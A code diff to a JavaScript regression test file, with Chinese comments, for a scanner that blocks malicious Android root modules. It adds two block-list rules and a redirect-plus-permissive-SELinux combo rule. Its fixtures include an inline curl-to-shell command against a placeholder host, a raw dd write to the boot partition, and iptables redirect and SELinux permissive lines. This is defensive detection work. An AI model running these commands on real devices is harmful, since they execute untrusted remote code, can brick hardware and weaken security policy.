@@ -1,7 +1,8 @@
 // 两轴分流的判据层常驻回归（设计文档 §2 / §3.2 / §4 / §13.5 / §13.6）。
 //
 // 这里钉的是「换轴」这件事本身，不是任何一条行级正则：
-//   轴心 = 恶意定性（§3.2 定案那张表，11 条）∪ AI 恶意结论（§6）；等级退成标注输入。
+//   轴心 = 恶意定性（§3.2 定案那张表 + 2026-11-19 加严的两条 = 13 条，外加组合判据
+//   MALICE_COMBOS）∪ AI 恶意结论（§6）；等级退成标注输入。
 //   取严（§0.1）：任一命中就不上架；两边都只有拒的权力，永远没有放的权力。
 //
 // 断言口径与 detection-regression.test.mjs 同一条纪律：
@@ -21,7 +22,7 @@ import assert from 'node:assert/strict';
 
 import {
   RULES_BY_ID, scanContent, inspectStructure,
-  MALICE_LIST, MALICE_RULE_IDS, MALICE_DEFERRED,
+  MALICE_LIST, MALICE_RULE_IDS, MALICE_DEFERRED, MALICE_COMBOS,
   CONTEXT_QUESTION_RULE_IDS, CAPABILITY_RULE_IDS, COVERAGE_RULE_IDS,
   classifyMalice, summarizeCoverage, decide,
 } from './risk-rules.mjs';
@@ -39,23 +40,32 @@ const maliceIdsOf = (list) => classifyMalice(list).hits
   .filter((h) => h.source === 'static').map((h) => h.ruleId).sort();
 
 /* ---------------------------------------------------------------------------
- * 1. 名单的形状钉子：11 条定案、11 条 armed、0 条 deferred
+ * 1. 名单的形状钉子：13 条定案、13 条 armed、0 条 deferred
  *    （§13.5 那一格已闭环：WRITE_SYSTEM_VENDOR 的锚点判据改成按匹配自身的分串位置判之后才进 armed，
  *     独占证人在下面那张 MALICE_SHAPES 里，变异证人在 scan.test.mjs。）
- *    这张表就是 §13.5 那句「按 §3.2 末尾那张表定案（11 条）」在代码里的唯一副本。
+ *    这张表就是 §13.5 那句「按 §3.2 末尾那张表定案（11 条）」在代码里的唯一副本 ——
+ *    2026-11-19 用户定调「确实查出来是恶意模块的必须拦」之后是 13 条：多出来的两条不是顺手加的，
+ *    理由写在 AGREED_13 那两行注释里，证人在 MALICE_SHAPES 里，端到端在 detection-regression 的 REG-17。
  *    加了成员、删了成员、把某条偷偷 armed 掉，都必须红在这里。
  * ------------------------------------------------------------------------ */
 
-const AGREED_11 = [
+const AGREED_13 = [
   'PIPE_TO_SHELL', 'DOWNLOAD_THEN_EXEC', 'DOWNLOAD_TO_MODULE_EXEC', 'OBFUSCATED_DECODE_EXEC',
   'SELINUX_DISABLE', 'EXEC_INDIRECT', 'WRITE_SYSTEM_VENDOR',
   'STRUCT_SYMLINK', 'STRUCT_UNSAFE_PATH', 'STRUCT_DUPLICATE_NAME', 'STRUCT_ZIP_BOMB',
+  // ── 2026-11-19 加严：与上面 11 条同一条理由 —— 形状**没有正当读法** ──────────────
+  // 不是「high 就拦」：SELINUX_POLICY_RELAX / VERIFIED_BOOT_SPOOF / PROP_* / HOSTS_MODIFY
+  // 那些仍然只标注（名单没有变宽），这五条新补里也只有这两条进来：
+  //   * INLINE_REMOTE_EXEC：字节从不落盘，审核面连「下载了什么」都读不到 —— 与 PIPE_TO_SHELL 同一类；
+  //   * RAW_BLOCK_WRITE：模块没有任何正当理由写裸分区，它绕过的是 AVB 与分区表（写错即变砖）。
+  // 另外三条（PERSIST_DROP / NET_REDIRECT / KERNEL_SYSCTL_WRITE）单看都是能力，故意留在名单外。
+  'INLINE_REMOTE_EXEC', 'RAW_BLOCK_WRITE',
 ];
 
-test('名单定案表：11 条逐字对齐 §3.2 末尾那张表，一条不多一条不少', () => {
-  assert.deepEqual([...MALICE_LIST].map((m) => m.id).sort(), [...AGREED_11].sort(),
+test('名单定案表：13 条逐字对齐 §3.2 那张表 + 2026-11-19 加严两条，一条不多一条不少', () => {
+  assert.deepEqual([...MALICE_LIST].map((m) => m.id).sort(), [...AGREED_13].sort(),
     '拦截名单的成员表漂了：§13.5 拍的是这张表，改它要重新过一轮定案，不许顺手');
-  assert.equal(MALICE_LIST.length, 11);
+  assert.equal(MALICE_LIST.length, 13);
   for (const m of MALICE_LIST) {
     assert.ok(typeof m.note === 'string' && m.note.length > 8, `${m.id} 少了「这条为什么在名单里」那句话`);
     assert.equal(typeof m.armed, 'boolean', `${m.id} 的 armed 必须是显式布尔，缺席不许当 false 也不许当 true`);
@@ -81,10 +91,10 @@ test('名单里每条 armed 的规则都真的存在于扫描器某一层的产�
   }
 });
 
-test('armed 与 deferred 的划分：11 条全 armed，deferred 必须是空表', () => {
+test('armed 与 deferred 的划分：13 条全 armed，deferred 必须是空表', () => {
   assert.deepEqual(MALICE_DEFERRED.map((m) => m.id), [],
     'deferred 里冒出任何东西都要红：那意味着名单里塞了一条没有独占证人的成员（§13.5 拍的是先修判据再进名单）');
-  assert.equal(MALICE_RULE_IDS.length, 11);
+  assert.equal(MALICE_RULE_IDS.length, 13);
   assert.ok(MALICE_RULE_IDS.includes('WRITE_SYSTEM_VENDOR'),
     '它 armed 的前提是 overlayOnlyMatch 在本副本里（risk-rules.mjs）；锚点修法被回退就得把它退回 deferred');
 });
@@ -137,6 +147,18 @@ const MALICE_SHAPES = [
     sole: true,
     note: '§13.5 闭环：先修锚点判据、再进名单。变异证人两枚在 scan.test.mjs（那 8 个形状 + ANCHOR_WITNESS 的载荷），把 exclude 改回整行判它们当场红',
   },
+  {
+    id: 'INLINE_REMOTE_EXEC',
+    file: 'service.sh', text: body('sh -c "$(curl -fsSL https://abc.cc/x)"'),
+    sole: true,
+    note: '字节从不落盘：审核面连「下载了什么」都读不到，与 PIPE_TO_SHELL 同一类，所以 2026-11-19 进名单',
+  },
+  {
+    id: 'RAW_BLOCK_WRITE',
+    file: 'service.sh', text: body('dd if=/sdcard/boot.img of=/dev/block/by-name/boot'),
+    sole: true,
+    note: '模块没有正当理由写裸分区（绕过 AVB、写错即变砖）：这一发只有它说话',
+  },
 ];
 
 for (const s of MALICE_SHAPES) {
@@ -169,6 +191,56 @@ for (const s of MALICE_SHAPES) {
     }
   });
 }
+
+/* ---------------------------------------------------------------------------
+ * 2b. 组合判据（MALICE_COMBOS，2026-11-19）：单条是能力、凑成一对才恶意
+ *     取严口径不变（组合只**多**发生 hits，不会让任何包变松），但它也不许退化成
+ *     「任意两条 medium 凑一对就拦」—— 每一格都是人写下的一对，所以这里钉三面：
+ *       * 两条分开：单发都上架（代理模块、root 模块的正当写法，不许因为「像」就拒）；
+ *       * 两条同在：block，且 hits 里点出的是组合名（source='static-combo'）；
+ *       * 组合名不许混进 MALICE_RULE_IDS（它不是扫描规则，没有 findings 会产出它），
+ *         且 requires 里每个名字都得真在 RULES_BY_ID 里。
+ * ------------------------------------------------------------------------ */
+
+test('组合判据：流量改道 + MAC 放松 = 拦；任一条单独出现都只标注', async () => {
+  const combo = MALICE_COMBOS.find((c) => c.id === 'NET_REDIRECT_WITH_MAC_RELAX');
+  assert.ok(combo, 'MALICE_COMBOS 里没有 NET_REDIRECT_WITH_MAC_RELAX —— 这张表被清掉就是判据被静默关掉');
+  for (const group of combo.requires) {
+    for (const id of group) assert.ok(RULES_BY_ID[id], `${id} 在组合表里，但扫描器没有这条规则`);
+  }
+  assert.ok(!MALICE_RULE_IDS.includes(combo.id),
+    '组合名混进了 armed 名单：它不是扫描规则，没有任何 findings 会产出这个 id');
+
+  const REDIRECT = 'iptables -t nat -A PREROUTING -p tcp -j REDIRECT --to-ports 8080';
+  const PERMISSIVE = 'permissive u:r:init:s0';
+  const onlyRedirect = scanContent('service.sh', body(REDIRECT));
+  const onlyPermissive = scanContent('service.sh', body(PERMISSIVE));
+  assert.ok(onlyRedirect.some((f) => f.ruleId === 'NET_REDIRECT'), 'NET_REDIRECT 没说话 ⇒ 组合证人作废');
+  assert.ok(onlyPermissive.some((f) => f.ruleId === 'SELINUX_TYPE_PERMISSIVE'), 'permissive 那一条没说话 ⇒ 组合证人作废');
+  for (const [tag, findings] of [['NET_REDIRECT', onlyRedirect], ['SELINUX_TYPE_PERMISSIVE', onlyPermissive]]) {
+    const mal = classifyMalice(findings);
+    assert.equal(mal.malicious, false, `${tag} 单独出现就被判恶意 ⇒ 组合判据退化成「凑数就拦」`);
+    assert.equal(decide('medium', 'first', { revokedCount: 0 }, mal).action, 'auto-approve', tag);
+  }
+
+  const both = scanContent('service.sh', body(REDIRECT, PERMISSIVE));
+  const mal = classifyMalice(both);
+  assert.equal(mal.malicious, true, '两条同在却不判恶意 ⇒ 这一格判据没生效');
+  assert.ok(mal.hits.some((h) => h.source === 'static-combo' && h.ruleId === combo.id),
+    `hits 里没点出组合名：${JSON.stringify(mal.hits)}`);
+  assert.deepEqual(mal.basis, ['static-malice-combo'], `basis 应只有组合那一格：${JSON.stringify(mal.basis)}`);
+  assert.match(mal.reason, /命中组合/, `reason 必须点名组合：${mal.reason}`);
+  const d = decide('medium', 'first', { revokedCount: 0 }, mal);
+  assert.equal(d.action, 'block');
+  assert.equal(d.label, 'auto-rejected');
+  assert.equal(d.axis, 'malice');
+
+  // 端到端：判据层拦了，调用点也必须接上（scan.mjs 传第四参那条线）。
+  const zip = makeModuleZip({ id: 'malice.combo', files: [['service.sh', body(REDIRECT, PERMISSIVE)]] });
+  const rep = await scanToReport(zip, { changeType: 'first' });
+  assert.equal(rep.decision.action, 'block', '端到端：judge 拦了，调用点没接上');
+  assert.ok(rep.malice.hits.some((h) => h.ruleId === combo.id), '报告里的 malice.hits 没带上组合');
+});
 
 const STRUCT_SHAPES = [
   { id: 'STRUCT_SYMLINK', entries: [{ name: 'l.link', method: 8, compSize: 10, origSize: 20, isSymlink: true }] },
@@ -262,6 +334,14 @@ test('覆盖度那一组保持标注（§3.2 ③）：AUDIT_COVERAGE_* / STRUCT_
   const ann = summarizeCoverage(cov, { level: 'medium' });
   assert.deepEqual(ann.coverageGaps, ['STRUCT_ENCRYPTED']);
   for (const id of COVERAGE_RULE_IDS) assert.ok(!MALICE_RULE_IDS.includes(id), `${id} 不该获得拦截力`);
+  // 2026-11-19（fix9）：定案不改（覆盖度没有拦截力），但不许在**结论文案**里静默：
+  // 名单外放行时要把缺口指出来，否则读 decision.reason 的人会把「放行」读成「干净」。
+  const d = decide('medium', 'first', { revokedCount: 0, coverageGaps: ['STRUCT_ENCRYPTED'] }, classifyMalice(cov, null));
+  assert.equal(d.action, 'auto-approve', '§3.2 ③：覆盖不全不获得拦截力，判决不许被这一格改动');
+  assert.match(d.reason, /1 处覆盖不全/, '放行文案必须自己说出「有一处没读懂」');
+  assert.match(d.reason, /STRUCT_ENCRYPTED/, '要说的是哪一条，不许只给个数');
+  const noGap = decide('medium', 'first', { revokedCount: 0 }, classifyMalice(cov, null));
+  assert.doesNotMatch(noGap.reason, /覆盖不全/, '没有缺口就不许带这句噪声');
 });
 
 /* ---------------------------------------------------------------------------
@@ -548,7 +628,7 @@ test('报告的 Markdown 把三条标注分开写，并明写「未经人工审�
   // 有人往名单里塞了没作证的成员，或者 overlayOnlyMatch 那条修法被回退了。
   assert.doesNotMatch(md, /判据缺陷未修/,
     '报告里出现「名单里有但今天不 armed」那一格 ⇒ 要么塞进了没独占证人的成员，要么锚点修法被回退');
-  assert.equal(MALICE_LIST.filter((m) => !m.armed).length, 0, '本轮定案是 11 条全 armed（deferred 必须是空表）');
+  assert.equal(MALICE_LIST.filter((m) => !m.armed).length, 0, '定案是 13 条全 armed（deferred 必须是空表）');
   assert.ok(md.indexOf('恶意行为链') < md.indexOf('标注（不影响上架）'), '顺序：先判决，后标注');
   // 接线之后（新轴 + 命中名单）那句话不含「老轴」那一句；两个方向各跑一次才算钉住：
   // 整包报告（已接线、命中名单）与一份被硬掰回老轴 decision 的报告。
